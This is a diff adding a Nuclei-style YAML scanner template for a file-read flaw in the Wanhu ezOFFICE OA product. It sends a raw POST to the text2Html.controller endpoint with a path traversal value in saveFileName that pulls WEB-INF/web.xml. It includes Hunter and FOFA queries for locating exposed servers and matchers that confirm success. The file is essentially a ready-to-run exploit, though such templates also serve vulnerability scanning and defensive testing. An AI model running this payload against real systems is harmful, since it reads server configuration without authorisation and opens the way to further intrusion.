@@ -1,0 +1,36 @@
+id: wanhu-ezoffice-text2Html-fileread
+
+info:
+  name: 万户 ezoffice ezoffice text2html - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,fileread,oa,ezoffice
+
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+      
+     
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body,'web-app','filter-name') && status_code == 200"
+          - "contains_all(body,'文件不存在') && status_code == 200"
+        condition: or
